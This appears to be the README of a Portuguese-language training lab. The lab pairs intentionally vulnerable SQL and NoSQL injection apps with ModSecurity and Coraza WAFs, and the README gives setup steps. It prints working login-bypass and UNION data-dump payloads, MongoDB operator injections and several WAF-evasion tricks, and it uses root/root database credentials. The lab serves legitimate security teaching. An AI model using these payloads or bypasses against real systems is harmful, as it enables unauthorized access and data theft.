# 🛡️ Cyber Shield Live – Laboratório de Injeção SQL, NoSQL e WAF

Repositório utilizado na live **"Contenção Imediata: Como bloquear um SQL Injection antes do deploy da correção"** Atlântico Avanti.

Este ambiente permite:
- Executar aplicações vulneráveis a **SQL Injection** (SQLi) e **NoSQL Injection**.
- Proteger as aplicações com **WAF** utilizando **ModSecurity** (com CRS) e **Coraza**.
- Testar **técnicas de bypass** e entender os limites de cada WAF.

---

## 📁 Estrutura do repositório

```
cyber-shield-live/
├── sqli-labs/               # Aplicação vulnerável a SQL Injection (PHP + MySQL)
├── nosql-labs/              # Aplicação vulnerável a NoSQL Injection (Node.js + MongoDB)
├── nginx-modsecurity/       # Proxy reverso com Nginx + ModSecurity + CRS
├── coraza/                  # Proxy reverso com Coraza (WAF em Go) + regras CRS adaptadas
└── README.md                # Este arquivo
```

---

## ⚙️ Pré‑requisitos

- [Docker](https://docs.docker.com/get-docker/) e [Docker Compose](https://docs.docker.com/compose/install/)
- `curl`, `sqlmap` (opcional para testes automatizados) – ou apenas um navegador
- Conhecimento básico de HTTP e injeção de código

---

## 🚀 Como executar os laboratórios

Todos os componentes são executados via Docker Compose. Cada subdiretório possui seu próprio `docker-compose.yml`.

### 1. SQLi Labs (sem WAF)

```bash
cd sqli-labs
docker-compose up -d
```

A aplicação ficará em `http://localhost:8080`  
Banco de dados MySQL em `localhost:3306` (usuário `root`, senha `root`)

### 2. NoSQL Labs (sem WAF)

```bash
cd nosql-labs
docker-compose up -d
```

A aplicação estará em `http://localhost:3000`  
MongoDB em `localhost:27017`

### 3. Com WAF ModSecurity (Nginx + ModSecurity + CRS)

```bash
cd nginx-modsecurity
docker-compose up -d
```

O WAF escutará em `http://localhost:80` e fará proxy para a aplicação vulnerável (que deve estar rodando).  
Ajuste o `proxy_pass` no arquivo de configuração do Nginx para apontar para o endereço da aplicação desejada.

### 4. Com WAF Coraza (proxy em Go)

```bash
cd coraza
docker-compose up -d
```

Coraza escuta em `http://localhost:8090` e aplica as regras CRS antes de encaminhar para o backend vulnerável.

---

## 💥 Exemplos de ataques

### SQL Injection (SQLi Labs)

**Cenário**: formulário de login com concatenação direta de strings.

Payload clássico no campo `username`:

```sql
' OR '1'='1' --
```

Ou para extrair dados via `UNION`:

```sql
' UNION SELECT username, password FROM users --
```

**Resultado sem WAF**: acesso não autorizado, dump de dados.

### NoSQL Injection (NoSQL Labs)

**Cenário**: autenticação usando MongoDB com operadores especiais.

Payload no campo `password`:

```json
{ "$ne": "" }
```

Ou em parâmetros URL:

```http
POST /login HTTP/1.1
Content-Type: application/json

{"username": "admin", "password": {"$ne": ""}}
```

**Resultado sem WAF**: login bypassado, acesso à conta administrativa.

---

## 🛑 Bloqueio pelo WAF

Com o ModSecurity ou Coraza ativos e utilizando a **OWASP Core Rule Set (CRS)**, as requisições maliciosas são bloqueadas com código `403 Forbidden`.

Exemplo de log do ModSecurity:

```
[error] [client 172.18.0.1] ModSecurity: Access denied with code 403 (phase 2). 
Matched "Operator GE" with parameter "5" against variable TX:ANOMALY_SCORE (Total score: 5). 
Rule ID 949110 [id "949110"] - Inbound Anomaly Score Exceeded.
```

---

## 🔓 Técnicas de bypass (exemplos didáticos)

Abaixo, algumas técnicas que **podem ou não** funcionar dependendo da versão das regras e da configuração do WAF. Use apenas em ambiente controlado.

### Bypass de ModSecurity / Coraza

1. **Ofuscação por comentários**  
   `' OR /**/1=1 --` – quebra a assinatura linear.

2. **Case variation** (se as regras forem case‑sensitive)  
   `' oR '1'='1`

3. **URL encode duplo**  
   `%2527%20OR%20%271%27=%271`

4. **Uso de funções SQL invulgares**  
   `' OR 1=1 AND SLEEP(5) --` (se a regra não cobre `SLEEP` explicitamente)

5. **NoSQL – usar `$regex` ao invés de `$ne`**  
   `{"username": "admin", "password": {"$regex": "^.*$"}}`

**Importante**: o objetivo do laboratório é mostrar que WAF não é bala de prata; ataques mais sofisticados ou regras mal configuradas podem ser contornados. A defesa em profundidade (WAF + validação de entrada + parâmetros nomeados + ORM) é sempre recomendada.

---

## 📚 Referências

- [OWASP Core Rule Set](https://coreruleset.org/)
- [ModSecurity](https://modsecurity.org/)
- [Coraza WAF](https://coraza.io/)
- [PayloadsAllTheThings – SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [PayloadsAllTheThings – NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)

---

## 📝 Licença

Este repositório é **apenas para fins educacionais**. As aplicações vulneráveis não devem ser expostas publicamente sem proteção adequada.

---

**Professor Ramon Martins** – Analista de Segurança da Informação  
[GitHub](https://github.com/monmartins) | [LinkedIn](https://www.linkedin.com/in/ramonmartins-c/)

